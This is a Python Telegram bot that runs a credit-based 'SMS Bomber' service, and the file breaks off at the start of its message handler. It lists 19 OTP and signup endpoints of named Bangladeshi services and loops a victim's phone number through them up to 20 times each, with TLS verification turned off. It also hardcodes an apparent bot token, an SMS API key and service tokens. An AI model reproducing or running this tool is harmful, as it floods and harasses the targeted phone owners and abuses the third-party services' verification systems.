import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import ssl
import csv
import socket
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from aiohttp.resolver import AsyncResolver

# ===================== কনফিগারেশন =====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8072096171:AAF0UBOlXnyQNBjczNeeFVDCaiExja1xiF0")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1967494059"))
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "RobiEntertainment")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "RobiEntertainment")
SMS_API_URL = "https://api.paglahost.shop/Custom_SMS/api.php"
SMS_API_KEY = "Shuvo55356"
DB_PATH = os.path.join(os.path.dirname(__file__), "bot_database.db")
API_LIMITS = {"daily_limit": 1000, "per_user_limit": 50, "api_call_interval": 0.8, "max_retries": 3}

WORKING_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
]

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ===================== ডাটাবেস =====================
async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10, total_sms INTEGER DEFAULT 0, total_bombing INTEGER DEFAULT 0, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, code))""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_usage (id INTEGER PRIMARY KEY AUTOINCREMENT, api_name TEXT, user_id INTEGER, success INTEGER, usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0, total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (user_id INTEGER, api_name TEXT, total_calls INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, api_name))""")
            await db.execute("""CREATE TABLE IF NOT EXISTS admin_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, action TEXT, target_id INTEGER, details TEXT, log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
            await db.commit()
            logger.info("✅ Database initialized")
    except Exception as e: logger.error(f"Database error: {e}")

def replace_phone(data, phone):
    if isinstance(data, dict): return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list): return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str): return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202, 204]:
        return any(word in text.lower() for word in ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done'])
    return False

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) VALUES (?, 1, ?, ?) ON CONFLICT(api_name) DO UPDATE SET total_calls = total_calls + 1, total_success = total_success + ?, total_failed = total_failed + ?, last_used = CURRENT_TIMESTAMP", (api_name, 1 if success else 0, 0 if success else 1, 1 if success else 0, 0 if success else 1))
            await db.execute("INSERT INTO user_api_stats (user_id, api_name, total_calls) VALUES (?, ?, 1) ON CONFLICT(user_id, api_name) DO UPDATE SET total_calls = total_calls + 1, last_used = CURRENT_TIMESTAMP", (user_id, api_name))
            await db.execute("INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)", (api_name, user_id, 1 if success else 0))
            await db.commit()
    except Exception as e: logger.error(f"Track API error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)", (admin_id, action, target_id, details))
            await db.commit()
    except Exception as e: logger.error(f"Admin log error: {e}")

def get_main_keyboard():
    return ReplyKeyboardMarkup([["📨 Send SMS", "💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats", "📞 Contact Admin"]], resize_keyboard=True)
def get_admin_keyboard():
    return ReplyKeyboardMarkup([["💰 Add Credit", "➖ Remove Credit"], ["🚫 Ban User", "✅ Unban User"], ["📣 Broadcast", "🎟️ Create Code"], ["📊 Live Stats", "📈 API Stats"], ["👥 Users List", "🏆 Top Users"], ["💰 Total Balance", "📋 API List"], ["🔄 Reset Limits", "📤 Export Data"], ["🗑️ Clear Logs", "📜 Admin Logs"], ["🔙 Back"]], resize_keyboard=True)
def get_back_keyboard():
    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)

# ===================== স্টার্ট (ব্যালেন্স ফিক্স সহ) =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)", (user_id, user.username or user.first_name))
        # 🔥 ব্যালেন্স ০ থাকলে ১০ করে দিন
        cursor = await db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = await cursor.fetchone()
        if row is None or row[0] is None or row[0] == 0:
            await db.execute("UPDATE users SET balance = 10 WHERE user_id = ?", (user_id,))
        await db.commit()
    if user_id == ADMIN_ID:
        await update.message.reply_text(f"👑 **Admin Panel**\nWelcome Admin {user.first_name}!\n🆔 ID: `{user_id}`", parse_mode="Markdown", reply_markup=get_admin_keyboard())
    else:
        await update.message.reply_text(f"🔥 **Welcome {user.first_name}!**\n🆔 ID: `{user_id}`\n💰 Balance: 10 Credits\n📡 APIs: {len(WORKING_APIS)}", parse_mode="Markdown", reply_markup=get_main_keyboard())

async def get_total_sms(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT total_sms FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else 0

# ===================== SEND SMS (DNS ফিক্স সহ) =====================
async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(f"❌ **Insufficient credits!**\n💰 Balance: {row[0] if row else 0}\n👨‍💻 Contact: @{ADMIN_USERNAME}", parse_mode="Markdown", reply_markup=get_main_keyboard())
                return
    await update.message.reply_text("📨 **Send SMS**\nEnter phone number:\nExample: `018XXXXXXXX`\n💰 Cost: 1 Credit", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'sms_number'

async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("❌ Invalid number!\nEnter 11 digits:", reply_markup=get_back_keyboard())
        return
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    await update.message.reply_text(f"✅ Number: `{number}`\n\n💬 **Enter your message:**", parse_mode="Markdown", reply_markup=get_back_keyboard())

async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg_text = update.message.text
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    await update.message.reply_text(f"⏳ Sending SMS to `{number}`...", parse_mode="Markdown")
    success = False
    response_text = ""
    try:
        params = {"key": SMS_API_KEY, "number": number, "msg": msg_text}
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        resolver = AsyncResolver(nameservers=["8.8.8.8", "1.1.1.1"])
        connector = aiohttp.TCPConnector(ssl=ssl_context, resolver=resolver, family=socket.AF_INET, timeout=60)
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(SMS_API_URL, params=params, timeout=45) as resp:
                response_text = await resp.text()
                try:
                    data = await resp.json()
                    if data.get("status") == "success": success = True
                except:
                    if "success" in response_text.lower(): success = True
    except Exception as e:
        response_text = str(e)
        logger.error(f"SMS error: {e}")
    if success:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
                row = await cur.fetchone()
                if row and row[0] > 0:
                    await db.execute("UPDATE users SET balance = balance - 1 WHERE user_id = ?", (user_id,))
                    await db.execute("UPDATE users SET total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
                    await db.commit()
                else:
                    await update.message.reply_text("❌ Insufficient credits!", reply_markup=get_main_keyboard())
                    context.user_data.clear()
                    return
        await update.message.reply_text(f"✅ **SMS Sent Successfully!**\n📱 Number: `{number}`\n💰 1 Credit deducted\n📨 Total Sent: {await get_total_sms(user_id)}", parse_mode="Markdown", reply_markup=get_main_keyboard())
    else:
        await update.message.reply_text(f"❌ **Failed to send SMS!**\n📱 Number: `{number}`\n⚠️ Error: `{response_text[:100]}`", parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== SMS BOMBER (DNS ফিক্স সহ) =====================
async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"💣 **SMS Bomber**\nEnter target number:\nExample: `018XXXXXXXX`\n📡 APIs: {len(WORKING_APIS)}\n⚠️ Max 20 per API", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("❌ Invalid number!\nEnter 11 digits:", reply_markup=get_back_keyboard())
        return
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    await update.message.reply_text(f"✅ Number: `{number}`\n\n💥 **Enter amount (1-20 per API):**\n📊 Total: {len(WORKING_APIS)} x amount", parse_mode="Markdown", reply_markup=get_back_keyboard())

async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 20:
            await update.message.reply_text("❌ Amount must be 1-20!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_back_keyboard())
        return
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    msg = await update.message.reply_text(f"⏳ **Bombing Started!**\n📱 Target: `{number}`\n📡 APIs: {total_apis}\n💥 Per API: {amount}\n📊 Total: {total_sms}", parse_mode="Markdown")
    success_count = 0
    failed_count = 0
    api_results = []
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    resolver = AsyncResolver(nameservers=["8.8.8.8", "1.1.1.1"])
    connector = aiohttp.TCPConnector(ssl=ssl_context, resolver=resolver, family=socket.AF_INET, timeout=60)
    timeout = aiohttp.ClientTimeout(total=90)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for i, api in enumerate(WORKING_APIS, 1):
            api_success = 0
            api_failed = 0
            for j in range(amount):
                try:
                    body = replace_phone(api['body'], number)
                    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                    if api['method'] == 'POST':
                        async with session.post(api['url'], json=body, headers=headers, timeout=30) as resp:
                            text = await resp.text()
                            if check_success(text, resp.status):
                                api_success += 1; success_count += 1
                            else:
                                api_failed += 1; failed_count += 1
                    else:
                        async with session.get(api['url'], headers=headers, timeout=30) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                api_success += 1; success_count += 1
                            else:
                                api_failed += 1; failed_count += 1
                except Exception as e:
                    api_failed += 1; failed_count += 1
                    logger.error(f"API error {api['name']}: {e}")
                if j == amount - 1:
                    await track_api_usage(api['name'], user_id, api_success > 0)
                total_done = (i-1) * amount + (j+1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        await msg.edit_text(f"⏳ **Bombing...**\n📱 Target: `{number}`\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Progress: {total_done}/{total_sms}", parse_mode="Markdown")
                    except: pass
            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET total_bombing = total_bombing + 1 WHERE user_id = ?", (user_id,))
        await db.commit()
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
    top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_apis_text = "\n".join([f"{idx}. {api['name']}: ✅{api['success']}" for idx, api in enumerate(top_apis, 1) if api['success'] > 0]) or "❌ No successful APIs!"
    await msg.edit_text(f"✅ **Bombing Complete!**\n📱 Target: `{number}`\n📡 APIs Used: {total_apis}\n💥 Total Sent: {total_sms}\n✅ Success: {success_count}\n❌ Failed: {failed_count}\n📊 Success Rate: {success_rate}%\n\n🏆 **Top 10 APIs:**\n{top_apis_text}", parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== প্রোফাইল, স্ট্যাটস, রিডিম, কন্টাক্ট =====================
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(f"👤 **My Profile**\n🆔 ID: `{user_id}`\n👤 Username: {row[0] or 'N/A'}\n💰 Balance: {row[1]}\n📨 SMS Sent: {row[2]}\n💣 Bombing Done: {row[3]}\n🚦 Status: {row[5].capitalize()}\n📅 Joined: {row[4][:10] if row[4] else 'N/A'}", parse_mode="Markdown", reply_markup=get_main_keyboard())

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance, total_sms, total_bombing FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(f"📊 **My Stats**\n💰 Balance: {row[0]}\n📨 SMS Sent: {row[1]}\n💣 Bombing Done: {row[2]}\n📡 Total APIs: {len(WORKING_APIS)}", parse_mode="Markdown", reply_markup=get_main_keyboard())

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎟 **Enter Redeem Code:**\nAvailable: `FREE50`, `WELCOME10`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ You already used this code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ Invalid or expired code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()
    await update.message.reply_text(f"🎉 **Code Redeemed!**\n✅ +{amount} Credits!", parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"📞 **Contact**\n👨‍💻 Admin: @{ADMIN_USERNAME}\n👨‍💻 Owner: @{OWNER_USERNAME}", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 Message Admin", url=f"https://t.me/{ADMIN_USERNAME}")]]))

# ===================== অ্যাডমিন ফাংশন (সংক্ষিপ্ত) =====================
async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("💰 **Add Credit**\nFormat: `ID AMOUNT`\nExample: `1967494059 50`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'add_credit'

async def admin_remove_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("➖ **Remove Credit**\nFormat: `ID AMOUNT`\nExample: `1967494059 20`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'remove_credit'

async def admin_ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🚫 **Ban User**\nEnter user ID:\nExample: `1967494059`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'ban_user'

async def admin_unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("✅ **Unban User**\nEnter user ID:\nExample: `1967494059`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'unban_user'

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("📣 **Broadcast**\nSend your message:", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'broadcast'

async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🎟️ **Create Code**\nFormat: `CODE AMOUNT USAGES`\nExample: `BONUS25 25 50`", parse_mode="Markdown", reply_markup=get_back_keyboard())
    context.user_data['admin_state'] = 'create_code'

async def admin_total_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT SUM(balance), COUNT(*), AVG(balance) FROM users") as cur:
            row = await cur.fetchone()
    await update.message.reply_text(f"💰 **Total Balance**\n👥 Total Users: {row[1]}\n💰 Total Balance: {row[0] or 0}\n📊 Average: {round(row[2] or 0, 2)}", parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_top_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, username, balance, total_sms, total_bombing FROM users ORDER BY balance DESC LIMIT 10") as cur:
            users = await cur.fetchall()
    if not users:
        await update.message.reply_text("No users!", reply_markup=get_admin_keyboard())
        return
    response = "🏆 **Top 10 Users**\n\n"
    for i, u in enumerate(users, 1):
        response += f"{i}. ID: `{u[0]}` - 💰{u[2]} | 📨{u[3]} | 💣{u[4]}\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_export_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("⏳ Exporting...")
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT * FROM users") as cur:
                users = await cur.fetchall()
        csv_file = f"users_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Balance', 'Total SMS', 'Total Bombing', 'Join Date', 'Status'])
            writer.writerows(users)
        await update.message.reply_document(document=open(csv_file, 'rb'), caption="📤 Users Data", reply_markup=get_admin_keyboard())
        os.remove(csv_file)
    except Exception as e:
        await update.message.reply_text(f"❌ {str(e)}", reply_markup=get_admin_keyboard())

async def admin_live_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    async with aiosqlite.connect(DB_PATH) as db:
        total = await db.execute("SELECT COUNT(*) FROM api_usage"); total = await total.fetchone()
        today = await db.execute("SELECT COUNT(*) FROM api_usage WHERE DATE(usage_time) = DATE('now')"); today = await today.fetchone()
        success = await db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 1"); success = await success.fetchone()
        failed = await db.execute("SELECT COUNT(*) FROM api_usage WHERE success = 0"); failed = await failed.fetchone()
        top = await db.execute("SELECT api_name, total_success, total_failed FROM api_stats ORDER BY total_success DESC LIMIT 5"); top = await top.fetchall()
    response = f"📊 **LIVE STATS**\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n📈 Total Calls: {total[0]}\n📈 Today: {today[0]}\n✅ Success: {success[0]}\n❌ Failed: {failed[0]}\n\n🏆 **Top 5 APIs:**\n"
    for i, api in enumerate(top, 1):
        total_calls = api[1] + api[2]
        rate = round((api[1] / total_calls) * 100, 2) if total_calls > 0 else 0
        response += f"{i}. {api[0]}: ✅{api[1]} ❌{api[2]} ({rate}%)\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_api_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT api_name, total_calls, total_success, total_failed, last_used FROM api_stats ORDER BY total_calls DESC LIMIT 15") as cur:
            apis = await cur.fetchall()
    if not apis:
        await update.message.reply_text("No stats!", reply_markup=get_admin_keyboard())
        return
    response = "📈 **API Statistics**\n\n"
    for api in apis:
        rate = round((api[2] / api[1]) * 100, 2) if api[1] > 0 else 0
        response += f"📡 {api[0]}\n   Calls: {api[1]} | ✅{api[2]} ❌{api[3]} | Rate: {rate}%\n\n"
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== হ্যান্ডলার =====================
async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = update.message.text
    state = context.user_data.get('admin_state')
    if state == 'add_credit':
        try:
            parts = msg.split(); target = int(parts[0]); amount = int(parts[1])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target))
                await db.commit()
            await admin_log(user_id, "Added Credit", target, f"{amount}")
            await update.message.reply_text(f"✅ Added {amount} to {target}!", reply_markup=get_admin_keyboard())
        except: await update.message.reply_text("❌ Use: `ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'remove_credit':
        try:
            parts = msg.split(); target = int(parts[0]); amount = int(parts[1])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target))
                await db.commit()
            await admin_log(user_id, "Removed Credit", target, f"{amount}")
            await update.message.reply_text(f"✅ Removed {amount} from {target}!", reply_markup=get_admin_keyboard())
        except: await update.message.reply_text("❌ Use: `ID AMOUNT`", parse_mode="Markdown")
        context.user_data['admin_state'] = None
    elif state == 'ban_user':
        try:
            target = int(msg.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target,))
                await db.commit()
            await admin_log(user_id, "Banned User", target)
            await update.message.reply_text(f"🚫 User {target} banned!", reply_markup=get_admin_keyboard())
        except: await update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'unban_user':
        try:
            target = int(msg.strip())
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target,))
                await db.commit()
            await admin_log(user_id, "Unbanned User", target)
            await update.message.reply_text(f"✅ User {target} unbanned!", reply_markup=get_admin_keyboard())
        except: await update.message.reply_text("❌ Invalid ID!")
        context.user_data['admin_state'] = None
    elif state == 'broadcast':
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT user_id FROM users WHERE status = 'active'") as cur:
                users = await cur.fetchall()
        await update.message.reply_text(f"⏳ Broadcasting to {len(users)} users...")
        success = 0
        for user in users:
            try:
                await context.bot.send_message(user[0], f"📢 **Admin Broadcast**\n\n{msg}", parse_mode='Markdown')
                success += 1
                await asyncio.sleep(0.05)
            except: pass
        await admin_log(user_id, "Broadcast", None, f"Sent to {success}")
        await update.message.reply_text(f"✅ Broadcast sent to {success} users!", reply_markup=get_admin_keyboard())
        context.user_data['admin_state'] = None
    elif state == 'create_code':
        try:
            parts = msg.split(); code = parts[0].upper(); amount = int(parts[1]); usages = int(parts[2])
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("INSERT INTO redeem_codes (code, amount, usages, created_by) VALUES (?, ?, ?, ?)", (code, amount, usages, user_id))
                await db.commit()
            await admin_log(user_id, "Created Code", None, f"{code}: {amount}x{usages}")
            await update.message.reply_text(f"✅ Code Created!\n🎟️ {code}\n💰 {amount} Credits\n👥 {usages} Uses", reply_markup=get_admin_keyboard())
        except: await update.message.reply_text("❌ Use: `CODE AMOUNT USAGES`", parse_mode="Markdown")
        context.user_data['admin_state'] = None

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
